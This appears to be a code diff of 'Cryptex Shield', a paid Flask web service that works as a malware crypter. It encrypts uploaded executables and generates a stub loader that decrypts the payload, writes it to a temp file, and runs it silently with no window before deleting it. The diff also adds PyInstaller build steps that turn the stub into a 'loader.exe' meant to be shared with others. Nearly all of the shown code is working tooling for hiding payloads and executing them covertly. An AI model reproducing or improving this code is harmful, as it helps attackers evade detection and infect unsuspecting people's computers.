@@ -1,16 +1,240 @@
-
-## Step 4: Find Your EXE
-The EXE will be in the "dist" folder as "loader.exe"
-
-## Step 5: Distribute
-Share loader.exe with anyone - it works without Python!
-
 # ============================================================
-# STUB CODE STARTS HERE
+# CRYPTEX SHIELD - COMPLETE PLATFORM v17 (FULLY WORKING)
 # ============================================================
 
-""" + stub_code
-        return instructions
+import os
+import sys
+import json
+import hashlib
+import secrets
+import string
+import sqlite3
+import base64
+import random
+import time
+import uuid
+import shutil
+import zlib
+import struct
+import tempfile
+import subprocess
+from datetime import datetime, timedelta
+from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for, send_file, flash
+from functools import wraps
+
+# Try to import crypto libraries
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad, unpad
+    from Crypto.Random import get_random_bytes
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    print("⚠️ PyCryptodome not installed. Install with: pip install pycryptodome")
+
+app = Flask(__name__)
+app.secret_key = os.urandom(64)
+app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
+
+# Get absolute paths
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_PATH = os.path.join(BASE_DIR, 'cryptex.db')
+UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
+STUB_FOLDER = os.path.join(BASE_DIR, 'stubs')
+EXE_FOLDER = os.path.join(BASE_DIR, 'exe_output')
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(STUB_FOLDER, exist_ok=True)
+os.makedirs(EXE_FOLDER, exist_ok=True)
+
+# ============================================================
+# POLYMORPHIC CRYPTER ENGINE
+# ============================================================
+class CryptexEngineV2:
+    ENCRYPTION_METHODS = ['aes_cbc', 'aes_cfb', 'xor_multi', 'rc4_like']
+    
+    @staticmethod
+    def rc4_like_encrypt(data, key):
+        s_box = list(range(256))
+        j = 0
+        for i in range(256):
+            j = (j + s_box[i] + key[i % len(key)]) % 256
+            s_box[i], s_box[j] = s_box[j], s_box[i]
+        encrypted = bytearray()
+        i = j = 0
+        for byte in data:
+            i = (i + 1) % 256
+            j = (j + s_box[i]) % 256
+            s_box[i], s_box[j] = s_box[j], s_box[i]
+            encrypted.append(byte ^ s_box[(s_box[i] + s_box[j]) % 256])
+        return bytes(encrypted)
+    
+    @staticmethod
+    def xor_multi_encrypt(data, key):
+        encrypted = bytearray()
+        for i, byte in enumerate(data):
+            encrypted.append(byte ^ key[i % len(key)])
+        return bytes(encrypted)
+
+# ============================================================
+# STANDALONE EXE STUB GENERATOR - FIXED
+# ============================================================
+class StubGenerator:
+    @staticmethod
+    def generate_stub_exe(encrypted_data, key, iv, method, original_name):
+        encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
+        key_b64 = base64.b64encode(key).decode('utf-8')
+        iv_b64 = base64.b64encode(iv).decode('utf-8')
+        ext = os.path.splitext(original_name)[1] if original_name else '.exe'
+        
+        stub_code = f'''
+import os
+import sys
+import base64
+import hashlib
+import tempfile
+import subprocess
+import ctypes
+import time
+import threading
+
+ENCRYPTED_DATA = """{encrypted_b64}"""
+KEY_B64 = """{key_b64}"""
+IV_B64 = """{iv_b64}"""
+METHOD = """{method}"""
+ORIGINAL_NAME = """{original_name}"""
+
+def xor_decrypt(data, key):
+    result = bytearray()
+    for i, byte in enumerate(data):
+        result.append(byte ^ key[i % len(key)])
+    return bytes(result)
+
+def aes_decrypt(data, key, iv):
+    try:
+        from Crypto.Cipher import AES
+        from Crypto.Util.Padding import unpad
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted = unpad(cipher.decrypt(data), AES.block_size)
+        return decrypted
+    except ImportError:
+        return xor_decrypt(data, key)
+
+def run_payload(payload):
+    try:
+        with tempfile.NamedTemporaryFile(delete=False, suffix='{ext}') as tmp:
+            tmp.write(payload)
+            tmp_path = tmp.name
+        
+        subprocess.Popen([tmp_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        def delete_later():
+            time.sleep(15)
+            try:
+                os.remove(tmp_path)
+            except:
+                pass
+        threading.Thread(target=delete_later, daemon=True).start()
+        return True
+    except Exception as e:
+        return False
+
+def main():
+    encrypted = base64.b64decode(ENCRYPTED_DATA)
+    key = base64.b64decode(KEY_B64)
+    iv = base64.b64decode(IV_B64)
+    
+    if METHOD == 'aes_cbc' or METHOD == 'aes':
+        try:
+            payload = aes_decrypt(encrypted, key, iv)
+        except:
+            payload = xor_decrypt(encrypted, key)
+    else:
+        payload = xor_decrypt(encrypted, key)
+    
+    run_payload(payload)
+
+if __name__ == '__main__':
+    main()
+'''
+        return stub_code
+
+    @staticmethod
+    def build_exe(stub_code, output_path):
+        try:
+            stub_file = os.path.join(STUB_FOLDER, 'stub_temp.py')
+            with open(stub_file, 'w', encoding='utf-8') as f:
+                f.write(stub_code)
+            
+            try:
+                import PyInstaller
+            except ImportError:
+                return False
+            
+            subprocess.run([
+                sys.executable, '-m', 'PyInstaller',
+                '--onefile',
+                '--windowed',
+                '--name=loader',
+                '--distpath=.',
+                '--workpath=build_temp',
+                '--specpath=build_temp',
+                '--hidden-import=Crypto',
+                '--hidden-import=Crypto.Cipher',
+                '--hidden-import=Crypto.Util',
+                '--hidden-import=Crypto.Random',
+                '--collect-all=Crypto',
+                stub_file
+            ], check=True, capture_output=True, text=True, timeout=300)
+            
+            if os.path.exists('loader.exe'):
+                shutil.move('loader.exe', output_path)
+                shutil.rmtree('build_temp', ignore_errors=True)
+                shutil.rmtree('build', ignore_errors=True)
+                for f in os.listdir('.'):
+                    if f.endswith('.spec'):
+                        os.remove(f)
+                os.remove(stub_file)
+                return True
+            return False
+        except Exception as e:
+            print(f"Build EXE error: {e}")
+            return False
+    
+    @staticmethod
+    def generate_build_instructions(stub_code, original_name):
+        instructions = (
+            "# ============================================================\n"
+            "# CRYPTEX SHIELD - Build Your Own EXE\n"
+            "# ============================================================\n"
+            "\n"
+            "This file contains the encrypted payload. To create a standalone EXE:\n"
+            "\n"
+            "## Step 1: Install Required Packages\n"
+            "```\n"
+            "pip install pyinstaller pycryptodome\n"
+            "```\n"
+            "\n"
+            "## Step 2: Save the Stub Code\n"
+            "Save this entire file as 'loader.py'\n"
+            "\n"
+            "## Step 3: Build the EXE\n"
+            "```\n"
+            "pyinstaller --onefile --windowed --name=loader loader.py\n"
+            "```\n"
+            "\n"
+            "## Step 4: Find Your EXE\n"
+            "The EXE will be in the 'dist' folder as 'loader.exe'\n"
+            "\n"
+            "## Step 5: Distribute\n"
+            "Share loader.exe with anyone - it works without Python!\n"
+            "\n"
+            "# ============================================================\n"
+            "# STUB CODE STARTS HERE\n"
+            "# ============================================================\n"
+            "\n"
+        )
+        return instructions + stub_code
 
 # ============================================================
 # DATABASE SETUP
@@ -438,14 +662,12 @@ def crypt_file():
     with open(stub_path, 'w', encoding='utf-8') as f:
         f.write(stub_code)
     
-    # Generate build instructions for local EXE building
     instructions = StubGenerator.generate_build_instructions(stub_code, original_name)
     instructions_filename = f'{download_id}_build_instructions.txt'
     instructions_path = os.path.join(STUB_FOLDER, instructions_filename)
     with open(instructions_path, 'w', encoding='utf-8') as f:
         f.write(instructions)
     
-    # Try to build EXE on server (may fail, that's ok)
     exe_filename = f'{download_id}.exe'
     exe_path = os.path.join(EXE_FOLDER, exe_filename)
     exe_built = StubGenerator.build_exe(stub_code, exe_path)
@@ -1186,24 +1408,20 @@ if __name__ == '__main__':
     init_db()
     print("✅ Database ready!")
     
-    # Check if PyInstaller is installed
     try:
         import PyInstaller
         print("✅ PyInstaller is installed - EXE building available")
     except ImportError:
         print("⚠️ PyInstaller not installed - EXE building will use local build method")
-        print("   Install with: pip install pyinstaller")
     
     if not CRYPTO_AVAILABLE:
         print("⚠️ PyCryptodome not installed. Install with: pip install pycryptodome")
     
     print("="*70)
-    print("  ⚡ CRYPTEX SHIELD — COMPLETE PLATFORM v16")
+    print("  ⚡ CRYPTEX SHIELD — COMPLETE PLATFORM v17")
     print("  🔥 Working Crypter + Standalone EXE Generator")
-    print("  📁 Upload EXE → Download Stub + Build Instructions")
     print("  👑 Admin: admin@cryptex.shield / Admin")
     print("  💳 PayPal: LingLing855")
-    print("  💡 Users can build their own EXE locally using the instructions")
     print("="*70)
     
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False, threaded=True)
